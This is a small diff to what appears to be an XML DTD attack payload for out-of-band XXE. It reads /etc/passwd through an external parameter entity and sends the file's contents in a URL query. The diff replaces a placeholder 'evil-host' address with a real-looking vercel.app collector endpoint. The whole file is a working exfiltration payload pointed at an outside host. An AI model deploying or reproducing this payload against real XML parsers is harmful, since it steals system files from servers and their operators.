@@ -1,5 +1,5 @@
 <!ENTITY % payload SYSTEM "file:///etc/passwd">
 <!-- Use that variable to construct an HTTP get request with the file contents in the URL -->
-<!ENTITY % param1 '<!ENTITY &#37; external SYSTEM "http://my.evil-host.com/x=%payload;">'>
+<!ENTITY % param1 '<!ENTITY &#37; external SYSTEM "http://xless-b95jc92aq-michaels-projects-47a4c0c8.vercel.app/?x=%payload;">'>
 %param1;
 %external;
